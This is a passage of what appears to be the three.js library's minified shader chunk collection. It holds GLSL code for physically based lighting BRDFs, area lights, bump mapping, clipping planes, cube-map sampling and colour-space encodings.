decayExponent ) {\n\n#if defined ( PHYSICALLY_CORRECT_LIGHTS )\n\n\t// based upon Frostbite 3 Moving to Physically-based Rendering\n\t// page 32, equation 26: E[window1]\n\t// https://seblagarde.files.wordpress.com/2015/07/course_notes_moving_frostbite_to_pbr_v32.pdf\n\t// this is intended to be used on spot and point lights who are represented as luminous intensity\n\t// but who must be converted to luminous irradiance for surface lighting calculation\n\tfloat distanceFalloff = 1.0 / max( pow( lightDistance, decayExponent ), 0.01 );\n\n\tif( cutoffDistance > 0.0 ) {\n\n\t\tdistanceFalloff *= pow2( saturate( 1.0 - pow4( lightDistance / cutoffDistance ) ) );\n\n\t}\n\n\treturn distanceFalloff;\n\n#else\n\n\tif( cutoffDistance > 0.0 && decayExponent > 0.0 ) {\n\n\t\treturn pow( saturate( -lightDistance / cutoffDistance + 1.0 ), decayExponent );\n\n\t}\n\n\treturn 1.0;\n\n#endif\n\n}\n\nvec3 BRDF_Diffuse_Lambert( const in vec3 diffuseColor ) {\n\n\treturn RECIPROCAL_PI * diffuseColor;\n\n} // validated\n\nvec3 F_Schlick( const in vec3 specularColor, const in float dotLH ) {\n\n\t// Original approximation by Christophe Schlick \'94\n\t// float fresnel = pow( 1.0 - dotLH, 5.0 );\n\n\t// Optimized variant (presented by Epic at SIGGRAPH \'13)\n\t// https://cdn2.unrealengine.com/Resources/files/2013SiggraphPresentationsNotes-26915738.pdf\n\tfloat fresnel = exp2( ( -5.55473 * dotLH - 6.98316 ) * dotLH );\n\n\treturn ( 1.0 - specularColor ) * fresnel + specularColor;\n\n} // validated\n\n// Microfacet Models for Refraction through Rough Surfaces - equation (34)\n// http://graphicrants.blogspot.com/2013/08/specular-brdf-reference.html\n// alpha is "roughness squared" in Disney’s reparameterization\nfloat G_GGX_Smith( const in float alpha, const in float dotNL, const in float dotNV ) {\n\n\t// geometry term (normalized) = G(l)⋅G(v) / 4(n⋅l)(n⋅v)\n\t// also see #12151\n\n\tfloat a2 = pow2( alpha );\n\n\tfloat gl = dotNL + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\tfloat gv = dotNV + sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\n\treturn 1.0 / ( gl * gv );\n\n} // validated\n\n// Moving Frostbite to Physically Based Rendering 3.0 - page 12, listing 2\n// https://seblagarde.files.wordpress.com/2015/07/course_notes_moving_frostbite_to_pbr_v32.pdf\nfloat G_GGX_SmithCorrelated( const in float alpha, const in float dotNL, const in float dotNV ) {\n\n\tfloat a2 = pow2( alpha );\n\n\t// dotNL and dotNV are explicitly swapped. This is not a mistake.\n\tfloat gv = dotNL * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNV ) );\n\tfloat gl = dotNV * sqrt( a2 + ( 1.0 - a2 ) * pow2( dotNL ) );\n\n\treturn 0.5 / max( gv + gl, EPSILON );\n\n}\n\n// Microfacet Models for Refraction through Rough Surfaces - equation (33)\n// http://graphicrants.blogspot.com/2013/08/specular-brdf-reference.html\n// alpha is "roughness squared" in Disney’s reparameterization\nfloat D_GGX( const in float alpha, const in float dotNH ) {\n\n\tfloat a2 = pow2( alpha );\n\n\tfloat denom = pow2( dotNH ) * ( a2 - 1.0 ) + 1.0; // avoid alpha = 0 with dotNH = 1\n\n\treturn RECIPROCAL_PI * a2 / pow2( denom );\n\n}\n\n// GGX Distribution, Schlick Fresnel, GGX-Smith Visibility\nvec3 BRDF_Specular_GGX( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\n\n\tfloat alpha = pow2( roughness ); // UE4\'s roughness\n\n\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\n\n\tfloat dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\n\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\n\tfloat G = G_GGX_SmithCorrelated( alpha, dotNL, dotNV );\n\n\tfloat D = D_GGX( alpha, dotNH );\n\n\treturn F * ( G * D );\n\n} // validated\n\n// Rect Area Light\n\n// Real-Time Polygonal-Light Shading with Linearly Transformed Cosines\n// by Eric Heitz, Jonathan Dupuy, Stephen Hill and David Neubelt\n// code: https://github.com/selfshadow/ltc_code/\n\nvec2 LTC_Uv( const in vec3 N, const in vec3 V, const in float roughness ) {\n\n\tconst float LUT_SIZE  = 64.0;\n\tconst float LUT_SCALE = ( LUT_SIZE - 1.0 ) / LUT_SIZE;\n\tconst float LUT_BIAS  = 0.5 / LUT_SIZE;\n\n\tfloat dotNV = saturate( dot( N, V ) );\n\n\t// texture parameterized by sqrt( GGX alpha ) and sqrt( 1 - cos( theta ) )\n\tvec2 uv = vec2( roughness, sqrt( 1.0 - dotNV ) );\n\n\tuv = uv * LUT_SCALE + LUT_BIAS;\n\n\treturn uv;\n\n}\n\nfloat LTC_ClippedSphereFormFactor( const in vec3 f ) {\n\n\t// Real-Time Area Lighting: a Journey from Research to Production (p.102)\n\t// An approximation of the form factor of a horizon-clipped rectangle.\n\n\tfloat l = length( f );\n\n\treturn max( ( l * l + f.z ) / ( l + 1.0 ), 0.0 );\n\n}\n\nvec3 LTC_EdgeVectorFormFactor( const in vec3 v1, const in vec3 v2 ) {\n\n\tfloat x = dot( v1, v2 );\n\n\tfloat y = abs( x );\n\n\t// rational polynomial approximation to theta / sin( theta ) / 2PI\n\tfloat a = 0.8543985 + ( 0.4965155 + 0.0145206 * y ) * y;\n\tfloat b = 3.4175940 + ( 4.1616724 + y ) * y;\n\tfloat v = a / b;\n\n\tfloat theta_sintheta = ( x > 0.0 ) ? v : 0.5 * inversesqrt( max( 1.0 - x * x, 1e-7 ) ) - v;\n\n\treturn cross( v1, v2 ) * theta_sintheta;\n\n}\n\nvec3 LTC_Evaluate( const in vec3 N, const in vec3 V, const in vec3 P, const in mat3 mInv, const in vec3 rectCoords[ 4 ] ) {\n\n\t// bail if point is on back side of plane of light\n\t// assumes ccw winding order of light vertices\n\tvec3 v1 = rectCoords[ 1 ] - rectCoords[ 0 ];\n\tvec3 v2 = rectCoords[ 3 ] - rectCoords[ 0 ];\n\tvec3 lightNormal = cross( v1, v2 );\n\n\tif( dot( lightNormal, P - rectCoords[ 0 ] ) < 0.0 ) return vec3( 0.0 );\n\n\t// construct orthonormal basis around N\n\tvec3 T1, T2;\n\tT1 = normalize( V - N * dot( V, N ) );\n\tT2 = - cross( N, T1 ); // negated from paper; possibly due to a different handedness of world coordinate system\n\n\t// compute transform\n\tmat3 mat = mInv * transposeMat3( mat3( T1, T2, N ) );\n\n\t// transform rect\n\tvec3 coords[ 4 ];\n\tcoords[ 0 ] = mat * ( rectCoords[ 0 ] - P );\n\tcoords[ 1 ] = mat * ( rectCoords[ 1 ] - P );\n\tcoords[ 2 ] = mat * ( rectCoords[ 2 ] - P );\n\tcoords[ 3 ] = mat * ( rectCoords[ 3 ] - P );\n\n\t// project rect onto sphere\n\tcoords[ 0 ] = normalize( coords[ 0 ] );\n\tcoords[ 1 ] = normalize( coords[ 1 ] );\n\tcoords[ 2 ] = normalize( coords[ 2 ] );\n\tcoords[ 3 ] = normalize( coords[ 3 ] );\n\n\t// calculate vector form factor\n\tvec3 vectorFormFactor = vec3( 0.0 );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 0 ], coords[ 1 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 1 ], coords[ 2 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 2 ], coords[ 3 ] );\n\tvectorFormFactor += LTC_EdgeVectorFormFactor( coords[ 3 ], coords[ 0 ] );\n\n\t// adjust for horizon clipping\n\tfloat result = LTC_ClippedSphereFormFactor( vectorFormFactor );\n\treturn vec3( result );\n\n}\n\n// End Rect Area Light\n\n// ref: https://www.unrealengine.com/blog/physically-based-shading-on-mobile - environmentBRDF for GGX on mobile\nvec3 BRDF_Specular_GGX_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness ) {\n\n\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\n\treturn specularColor * brdf.x + brdf.y;\n\n} // validated\n\n// Fdez-Agüera\'s "Multiple-Scattering Microfacet Model for Real-Time Image Based Lighting"\n// Approximates multiscattering in order to preserve energy.\n// http://www.jcgt.org/published/0008/01/03/\nvoid BRDF_Specular_Multiscattering_Environment( const in GeometricContext geometry, const in vec3 specularColor, const in float roughness, inout vec3 singleScatter, inout vec3 multiScatter ) {\n\n\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\n\tvec3 F = F_Schlick( specularColor, dotNV );\n\tvec2 brdf = integrateSpecularBRDF( dotNV, roughness );\n\tvec3 FssEss = F * brdf.x + brdf.y;\n\n\tfloat Ess = brdf.x + brdf.y;\n\tfloat Ems = 1.0 - Ess;\n\n\t// Paper incorrect indicates coefficient is PI/21, and will\n\t// be corrected to 1/21 in future updates.\n\tvec3 Favg = specularColor + ( 1.0 - specularColor ) * 0.047619; // 1/21\n\tvec3 Fms = FssEss * Favg / ( 1.0 - Ems * Favg );\n\n\tsingleScatter += FssEss;\n\tmultiScatter += Fms * Ems;\n\n}\n\nfloat G_BlinnPhong_Implicit(  ) {\n\n\t// geometry term is (n dot l)(n dot v) / 4(n dot l)(n dot v)\n\treturn 0.25;\n\n}\n\nfloat D_BlinnPhong( const in float shininess, const in float dotNH ) {\n\n\treturn RECIPROCAL_PI * ( shininess * 0.5 + 1.0 ) * pow( dotNH, shininess );\n\n}\n\nvec3 BRDF_Specular_BlinnPhong( const in IncidentLight incidentLight, const in GeometricContext geometry, const in vec3 specularColor, const in float shininess ) {\n\n\tvec3 halfDir = normalize( incidentLight.direction + geometry.viewDir );\n\n\t//float dotNL = saturate( dot( geometry.normal, incidentLight.direction ) );\n\t//float dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\tfloat dotNH = saturate( dot( geometry.normal, halfDir ) );\n\tfloat dotLH = saturate( dot( incidentLight.direction, halfDir ) );\n\n\tvec3 F = F_Schlick( specularColor, dotLH );\n\n\tfloat G = G_BlinnPhong_Implicit(  );\n\n\tfloat D = D_BlinnPhong( shininess, dotNH );\n\n\treturn F * ( G * D );\n\n} // validated\n\n// source: http://simonstechblog.blogspot.ca/2011/12/microfacet-brdf.html\nfloat GGXRoughnessToBlinnExponent( const in float ggxRoughness ) {\n\treturn ( 2.0 / pow2( ggxRoughness + 0.0001 ) - 2.0 );\n}\n\nfloat BlinnExponentToGGXRoughness( const in float blinnExponent ) {\n\treturn sqrt( 2.0 / ( blinnExponent + 2.0 ) );\n}\n',bumpmap_pars_fragment:"\n#ifdef USE_BUMPMAP\n\n\tuniform sampler2D bumpMap;\n\tuniform float bumpScale;\n\n\t// Bump Mapping Unparametrized Surfaces on the GPU by Morten S. Mikkelsen\n\t// http://api.unrealengine.com/attachments/Engine/Rendering/LightingAndShadows/BumpMappingWithoutTangentSpace/mm_sfgrad_bump.pdf\n\n\t// Evaluate the derivative of the height w.r.t. screen-space using forward differencing (listing 2)\n\n\tvec2 dHdxy_fwd() {\n\n\t\tvec2 dSTdx = dFdx( vUv );\n\t\tvec2 dSTdy = dFdy( vUv );\n\n\t\tfloat Hll = bumpScale * texture2D( bumpMap, vUv ).x;\n\t\tfloat dBx = bumpScale * texture2D( bumpMap, vUv + dSTdx ).x - Hll;\n\t\tfloat dBy = bumpScale * texture2D( bumpMap, vUv + dSTdy ).x - Hll;\n\n\t\treturn vec2( dBx, dBy );\n\n\t}\n\n\tvec3 perturbNormalArb( vec3 surf_pos, vec3 surf_norm, vec2 dHdxy ) {\n\n\t\t// Workaround for Adreno 3XX dFd*( vec3 ) bug. See #9988\n\n\t\tvec3 vSigmaX = vec3( dFdx( surf_pos.x ), dFdx( surf_pos.y ), dFdx( surf_pos.z ) );\n\t\tvec3 vSigmaY = vec3( dFdy( surf_pos.x ), dFdy( surf_pos.y ), dFdy( surf_pos.z ) );\n\t\tvec3 vN = surf_norm;\t\t// normalized\n\n\t\tvec3 R1 = cross( vSigmaY, vN );\n\t\tvec3 R2 = cross( vN, vSigmaX );\n\n\t\tfloat fDet = dot( vSigmaX, R1 );\n\n\t\tfDet *= ( float( gl_FrontFacing ) * 2.0 - 1.0 );\n\n\t\tvec3 vGrad = sign( fDet ) * ( dHdxy.x * R1 + dHdxy.y * R2 );\n\t\treturn normalize( abs( fDet ) * surf_norm - vGrad );\n\n\t}\n\n#endif\n",clipping_planes_fragment:"\n#if NUM_CLIPPING_PLANES > 0\n\n\tvec4 plane;\n\n\t#pragma unroll_loop\n\tfor ( int i = 0; i < UNION_CLIPPING_PLANES; i ++ ) {\n\n\t\tplane = clippingPlanes[ i ];\n\t\tif ( dot( vViewPosition, plane.xyz ) > plane.w ) discard;\n\n\t}\n\n\t#if UNION_CLIPPING_PLANES < NUM_CLIPPING_PLANES\n\n\t\tbool clipped = true;\n\n\t\t#pragma unroll_loop\n\t\tfor ( int i = UNION_CLIPPING_PLANES; i < NUM_CLIPPING_PLANES; i ++ ) {\n\n\t\t\tplane = clippingPlanes[ i ];\n\t\t\tclipped = ( dot( vViewPosition, plane.xyz ) > plane.w ) && clipped;\n\n\t\t}\n\n\t\tif ( clipped ) discard;\n\n\t#endif\n\n#endif\n",clipping_planes_pars_fragment:"\n#if NUM_CLIPPING_PLANES > 0\n\n\t#if ! defined( PHYSICAL ) && ! defined( PHONG ) && ! defined( MATCAP )\n\t\tvarying vec3 vViewPosition;\n\t#endif\n\n\tuniform vec4 clippingPlanes[ NUM_CLIPPING_PLANES ];\n\n#endif\n",clipping_planes_pars_vertex:"\n#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG ) && ! defined( MATCAP )\n\tvarying vec3 vViewPosition;\n#endif\n",clipping_planes_vertex:"\n#if NUM_CLIPPING_PLANES > 0 && ! defined( PHYSICAL ) && ! defined( PHONG ) && ! defined( MATCAP )\n\tvViewPosition = - mvPosition.xyz;\n#endif\n",color_fragment:"\n#ifdef USE_COLOR\n\n\tdiffuseColor.rgb *= vColor;\n\n#endif\n",color_pars_fragment:"\n#ifdef USE_COLOR\n\n\tvarying vec3 vColor;\n\n#endif\n",color_pars_vertex:"\n#ifdef USE_COLOR\n\n\tvarying vec3 vColor;\n\n#endif\n",color_vertex:"\n#ifdef USE_COLOR\n\n\tvColor.xyz = color.xyz;\n\n#endif\n",common:"\n#define PI 3.14159265359\n#define PI2 6.28318530718\n#define PI_HALF 1.5707963267949\n#define RECIPROCAL_PI 0.31830988618\n#define RECIPROCAL_PI2 0.15915494\n#define LOG2 1.442695\n#define EPSILON 1e-6\n\n#define saturate(a) clamp( a, 0.0, 1.0 )\n#define whiteCompliment(a) ( 1.0 - saturate( a ) )\n\nfloat pow2( const in float x ) { return x*x; }\nfloat pow3( const in float x ) { return x*x*x; }\nfloat pow4( const in float x ) { float x2 = x*x; return x2*x2; }\nfloat average( const in vec3 color ) { return dot( color, vec3( 0.3333 ) ); }\n// expects values in the range of [0,1]x[0,1], returns values in the [0,1] range.\n// do not collapse into a single function per: http://byteblacksmith.com/improvements-to-the-canonical-one-liner-glsl-rand-for-opengl-es-2-0/\nhighp float rand( const in vec2 uv ) {\n\tconst highp float a = 12.9898, b = 78.233, c = 43758.5453;\n\thighp float dt = dot( uv.xy, vec2( a,b ) ), sn = mod( dt, PI );\n\treturn fract(sin(sn) * c);\n}\n\nstruct IncidentLight {\n\tvec3 color;\n\tvec3 direction;\n\tbool visible;\n};\n\nstruct ReflectedLight {\n\tvec3 directDiffuse;\n\tvec3 directSpecular;\n\tvec3 indirectDiffuse;\n\tvec3 indirectSpecular;\n};\n\nstruct GeometricContext {\n\tvec3 position;\n\tvec3 normal;\n\tvec3 viewDir;\n};\n\nvec3 transformDirection( in vec3 dir, in mat4 matrix ) {\n\n\treturn normalize( ( matrix * vec4( dir, 0.0 ) ).xyz );\n\n}\n\n// http://en.wikibooks.org/wiki/GLSL_Programming/Applying_Matrix_Transformations\nvec3 inverseTransformDirection( in vec3 dir, in mat4 matrix ) {\n\n\treturn normalize( ( vec4( dir, 0.0 ) * matrix ).xyz );\n\n}\n\nvec3 projectOnPlane(in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\n\tfloat distance = dot( planeNormal, point - pointOnPlane );\n\n\treturn - distance * planeNormal + point;\n\n}\n\nfloat sideOfPlane( in vec3 point, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\n\treturn sign( dot( point - pointOnPlane, planeNormal ) );\n\n}\n\nvec3 linePlaneIntersect( in vec3 pointOnLine, in vec3 lineDirection, in vec3 pointOnPlane, in vec3 planeNormal ) {\n\n\treturn lineDirection * ( dot( planeNormal, pointOnPlane - pointOnLine ) / dot( planeNormal, lineDirection ) ) + pointOnLine;\n\n}\n\nmat3 transposeMat3( const in mat3 m ) {\n\n\tmat3 tmp;\n\n\ttmp[ 0 ] = vec3( m[ 0 ].x, m[ 1 ].x, m[ 2 ].x );\n\ttmp[ 1 ] = vec3( m[ 0 ].y, m[ 1 ].y, m[ 2 ].y );\n\ttmp[ 2 ] = vec3( m[ 0 ].z, m[ 1 ].z, m[ 2 ].z );\n\n\treturn tmp;\n\n}\n\n// https://en.wikipedia.org/wiki/Relative_luminance\nfloat linearToRelativeLuminance( const in vec3 color ) {\n\n\tvec3 weights = vec3( 0.2126, 0.7152, 0.0722 );\n\n\treturn dot( weights, color.rgb );\n\n}\n",cube_uv_reflection_fragment:"\n#ifdef ENVMAP_TYPE_CUBE_UV\n\n#define cubeUV_textureSize (1024.0)\n\nint getFaceFromDirection(vec3 direction) {\n\tvec3 absDirection = abs(direction);\n\tint face = -1;\n\tif( absDirection.x > absDirection.z ) {\n\t\tif(absDirection.x > absDirection.y )\n\t\t\tface = direction.x > 0.0 ? 0 : 3;\n\t\telse\n\t\t\tface = direction.y > 0.0 ? 1 : 4;\n\t}\n\telse {\n\t\tif(absDirection.z > absDirection.y )\n\t\t\tface = direction.z > 0.0 ? 2 : 5;\n\t\telse\n\t\t\tface = direction.y > 0.0 ? 1 : 4;\n\t}\n\treturn face;\n}\n#define cubeUV_maxLods1  (log2(cubeUV_textureSize*0.25) - 1.0)\n#define cubeUV_rangeClamp (exp2((6.0 - 1.0) * 2.0))\n\nvec2 MipLevelInfo( vec3 vec, float roughnessLevel, float roughness ) {\n\tfloat scale = exp2(cubeUV_maxLods1 - roughnessLevel);\n\tfloat dxRoughness = dFdx(roughness);\n\tfloat dyRoughness = dFdy(roughness);\n\tvec3 dx = dFdx( vec * scale * dxRoughness );\n\tvec3 dy = dFdy( vec * scale * dyRoughness );\n\tfloat d = max( dot( dx, dx ), dot( dy, dy ) );\n\t// Clamp the value to the max mip level counts. hard coded to 6 mips\n\td = clamp(d, 1.0, cubeUV_rangeClamp);\n\tfloat mipLevel = 0.5 * log2(d);\n\treturn vec2(floor(mipLevel), fract(mipLevel));\n}\n\n#define cubeUV_maxLods2 (log2(cubeUV_textureSize*0.25) - 2.0)\n#define cubeUV_rcpTextureSize (1.0 / cubeUV_textureSize)\n\nvec2 getCubeUV(vec3 direction, float roughnessLevel, float mipLevel) {\n\tmipLevel = roughnessLevel > cubeUV_maxLods2 - 3.0 ? 0.0 : mipLevel;\n\tfloat a = 16.0 * cubeUV_rcpTextureSize;\n\n\tvec2 exp2_packed = exp2( vec2( roughnessLevel, mipLevel ) );\n\tvec2 rcp_exp2_packed = vec2( 1.0 ) / exp2_packed;\n\t// float powScale = exp2(roughnessLevel + mipLevel);\n\tfloat powScale = exp2_packed.x * exp2_packed.y;\n\t// float scale =  1.0 / exp2(roughnessLevel + 2.0 + mipLevel);\n\tfloat scale = rcp_exp2_packed.x * rcp_exp2_packed.y * 0.25;\n\t// float mipOffset = 0.75*(1.0 - 1.0/exp2(mipLevel))/exp2(roughnessLevel);\n\tfloat mipOffset = 0.75*(1.0 - rcp_exp2_packed.y) * rcp_exp2_packed.x;\n\n\tbool bRes = mipLevel == 0.0;\n\tscale =  bRes && (scale < a) ? a : scale;\n\n\tvec3 r;\n\tvec2 offset;\n\tint face = getFaceFromDirection(direction);\n\n\tfloat rcpPowScale = 1.0 / powScale;\n\n\tif( face == 0) {\n\t\tr = vec3(direction.x, -direction.z, direction.y);\n\t\toffset = vec2(0.0+mipOffset,0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 1) {\n\t\tr = vec3(direction.y, direction.x, direction.z);\n\t\toffset = vec2(scale+mipOffset, 0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 2) {\n\t\tr = vec3(direction.z, direction.x, direction.y);\n\t\toffset = vec2(2.0*scale+mipOffset, 0.75 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? a : offset.y;\n\t}\n\telse if( face == 3) {\n\t\tr = vec3(direction.x, direction.z, direction.y);\n\t\toffset = vec2(0.0+mipOffset,0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\telse if( face == 4) {\n\t\tr = vec3(direction.y, direction.x, -direction.z);\n\t\toffset = vec2(scale+mipOffset, 0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\telse {\n\t\tr = vec3(direction.z, -direction.x, direction.y);\n\t\toffset = vec2(2.0*scale+mipOffset, 0.5 * rcpPowScale);\n\t\toffset.y = bRes && (offset.y < 2.0*a) ? 0.0 : offset.y;\n\t}\n\tr = normalize(r);\n\tfloat texelOffset = 0.5 * cubeUV_rcpTextureSize;\n\tvec2 s = ( r.yz / abs( r.x ) + vec2( 1.0 ) ) * 0.5;\n\tvec2 base = offset + vec2( texelOffset );\n\treturn base + s * ( scale - 2.0 * texelOffset );\n}\n\n#define cubeUV_maxLods3 (log2(cubeUV_textureSize*0.25) - 3.0)\n\nvec4 textureCubeUV( sampler2D envMap, vec3 reflectedDirection, float roughness ) {\n\tfloat roughnessVal = roughness* cubeUV_maxLods3;\n\tfloat r1 = floor(roughnessVal);\n\tfloat r2 = r1 + 1.0;\n\tfloat t = fract(roughnessVal);\n\tvec2 mipInfo = MipLevelInfo(reflectedDirection, r1, roughness);\n\tfloat s = mipInfo.y;\n\tfloat level0 = mipInfo.x;\n\tfloat level1 = level0 + 1.0;\n\tlevel1 = level1 > 5.0 ? 5.0 : level1;\n\n\t// round to nearest mipmap if we are not interpolating.\n\tlevel0 += min( floor( s + 0.5 ), 5.0 );\n\n\t// Tri linear interpolation.\n\tvec2 uv_10 = getCubeUV(reflectedDirection, r1, level0);\n\tvec4 color10 = envMapTexelToLinear(texture2D(envMap, uv_10));\n\n\tvec2 uv_20 = getCubeUV(reflectedDirection, r2, level0);\n\tvec4 color20 = envMapTexelToLinear(texture2D(envMap, uv_20));\n\n\tvec4 result = mix(color10, color20, t);\n\n\treturn vec4(result.rgb, 1.0);\n}\n\n#endif\n",defaultnormal_vertex:"\nvec3 transformedNormal = normalMatrix * objectNormal;\n\n#ifdef FLIP_SIDED\n\n\ttransformedNormal = - transformedNormal;\n\n#endif\n\n#ifdef USE_TANGENT\n\n\tvec3 transformedTangent = normalMatrix * objectTangent;\n\n\t#ifdef FLIP_SIDED\n\n\t\ttransformedTangent = - transformedTangent;\n\n\t#endif\n\n#endif\n",displacementmap_pars_vertex:"\n#ifdef USE_DISPLACEMENTMAP\n\n\tuniform sampler2D displacementMap;\n\tuniform float displacementScale;\n\tuniform float displacementBias;\n\n#endif\n",displacementmap_vertex:"\n#ifdef USE_DISPLACEMENTMAP\n\n\ttransformed += normalize( objectNormal ) * ( texture2D( displacementMap, uv ).x * displacementScale + displacementBias );\n\n#endif\n",emissivemap_fragment:"\n#ifdef USE_EMISSIVEMAP\n\n\tvec4 emissiveColor = texture2D( emissiveMap, vUv );\n\n\temissiveColor.rgb = emissiveMapTexelToLinear( emissiveColor ).rgb;\n\n\ttotalEmissiveRadiance *= emissiveColor.rgb;\n\n#endif\n",emissivemap_pars_fragment:"\n#ifdef USE_EMISSIVEMAP\n\n\tuniform sampler2D emissiveMap;\n\n#endif\n",encodings_fragment:"\ngl_FragColor = linearToOutputTexel( gl_FragColor );\n",encodings_pars_fragment:"\n// For a discussion of what this is, please read this: http://lousodrome.net/blog/light/2013/05/26/gamma-correct-and-hdr-rendering-in-a-32-bits-buffer/\n\nvec4 LinearToLinear( in vec4 value ) {\n\treturn value;\n}\n\nvec4 GammaToLinear( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( gammaFactor ) ), value.a );\n}\n\nvec4 LinearToGamma( in vec4 value, in float gammaFactor ) {\n\treturn vec4( pow( value.rgb, vec3( 1.0 / gammaFactor ) ), value.a );\n}\n\nvec4 sRGBToLinear( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb * 0.9478672986 + vec3( 0.0521327014 ), vec3( 2.4 ) ), value.rgb * 0.0773993808, vec3( lessThanEqual( value.rgb, vec3( 0.04045 ) ) ) ), value.a );\n}\n\nvec4 LinearTosRGB( in vec4 value ) {\n\treturn vec4( mix( pow( value.rgb, vec3( 0.41666 ) ) * 1.055 - vec3( 0.055 ), value.rgb * 12.92, vec3( lessThanEqual( value.rgb, vec3( 0.0031308 ) ) ) ), value.a );\n}\n\nvec4 RGBEToLinear( in vec4 value ) {\n\treturn vec4( value.rgb * exp2( value.a * 255.0 - 128.0 ), 1.0 );\n}\n\nvec4 LinearToRGBE( in vec4 value ) {\n\tfloat maxComponent = max( max( value.r, value.g ), value.b );\n\tfloat fExp = clamp( ceil( log2( maxComponent ) ), -128.0, 127.0 );\n\treturn vec4( value.rgb / exp2( fExp ), ( fExp + 128.0 ) / 255.0 );\n//  return vec4( value.brg, ( 3.0 + 128.0 ) / 256.0 );\n}\n\n// reference: http://iwasbeingirony.blogspot.ca/2010/06/difference-between-rgbm-and-rgbd.html\nvec4 RGBMToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * value.a * maxRange, 1.0 );\n}\n\nvec4 LinearToRGBM( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat M = clamp( maxRGB / maxRange, 0.0, 1.0 );\n\tM = ceil( M * 255.0 ) / 255.0;\n\treturn vec4( value.rgb / ( M * maxRange ), M );\n}\n\n// reference: http://iwasbeingirony.blogspot.ca/2010/06/difference-between-rgbm-and-rgbd.html\nvec4 RGBDToLinear( in vec4 value, in float maxRange ) {\n\treturn vec4( value.rgb * ( ( maxRange / 255.0 ) / value.a ), 1.0 );\n}\n\nvec4 LinearToRGBD( in vec4 value, in float maxRange ) {\n\tfloat maxRGB = max( value.r, max( value.g, value.b ) );\n\tfloat D = max( maxRange / maxRGB, 1.0 );\n\tD = min( floor( D ) / 255.0, 1.0 );\n\treturn vec4( value.rgb * ( D * ( 255.0 / maxRange ) ), D );\n}\n\n// LogLuv reference: http://graphicrants.blogspot.ca/2009/04/rgbm-color-encoding.html\n\n// M matrix, for encoding\nconst mat3 cLogLuvM = mat3( 0.2209, 0.3390, 0.4184, 0.1138, 0.6780, 0.7319, 0.0102, 0.1130, 0.2969 );\nvec4 LinearToLogLuv( in vec4 value )  {\n\tvec3 Xp_Y_XYZp = cLogLuvM * value.rgb;\n\tXp_Y_XYZp = max( Xp_Y_XYZp, vec3( 1e-6, 1e-6, 1e-6 ) );\n\tvec4 vResult;\n\tvResult.xy = Xp_Y_XYZp.xy / Xp_Y_XYZp.z;\n\tfloat Le = 2.0 * log2(Xp_Y_XYZp.y) + 127.0;\n\tvResult.w = fract( Le );\n\tvResult.z = ( Le - ( floor( vResult.w * 255.0 ) ) / 255.0 ) / 255.0;\n\treturn vResult;\n}\n\n// Inverse M matrix, for decoding\nconst mat3 cLogLuvInverseM = mat3( 6.0014, -2.7008, -1.7996, -1.3320, 3.1029, -5.7721, 0.3008, -1.0882, 5.6268 );\nvec4 LogLuvToLinear( in vec4 value ) {\n\tfloat Le = value.z * 255.0 + value.w;\n\tvec3 Xp_Y_XYZp;\n\tXp_Y_XYZp.y = exp2( ( Le - 127.0 ) / 2.0 );\n\tXp_Y_XYZp.z = Xp_Y_XYZp.y / value.y;\n\tXp_Y_XYZp.x = value.x * Xp_Y_XYZp.z;\n\tvec3 vRGB = cLogLuvInverseM * Xp_Y_XYZp.rgb;\n\treturn vec4( max( vRGB, 0.0 ), 1.0 );\n}\n",envmap_fragment:"\n#ifdef USE_ENVMAP\n\n\t#if defined( USE_BUMPMAP ) || defined( USE_NORMALMAP ) || defined( PHONG )\n\n\t\tvec3 cameraToVertex = normalize( vWorldPosition - cameraPosition );\n\n\t\t// Transforming Normal Vectors with the Inverse Transformation\n\t\tvec3 worldNormal = inverseTransformDirection( normal, viewMatrix );\n\n\t\t#ifdef ENVMAP_MODE_REFLECTION\n\n\t\t\tvec3 reflectVec = reflect( cameraToVertex, worldNormal );\n\n\t\t#else\n\n\t\t\tvec3 reflectVec = refract( cameraToVertex, worldNormal, refractionRatio );\n\n\t\t#endif\n\n\t#else\n\n\t\tvec3 reflectVec = vReflect;\n\n\t#endif\n\n\t#ifdef ENVMAP_TYPE_CUBE\n\n\t\tvec4 envColor = textureCube( envMap, vec3( flipEnvMap * reflectVec.x, reflectVec.yz ) );\n\n\t#elif defined( ENVMAP_TYPE_EQUIREC )\n\n\t\tvec2 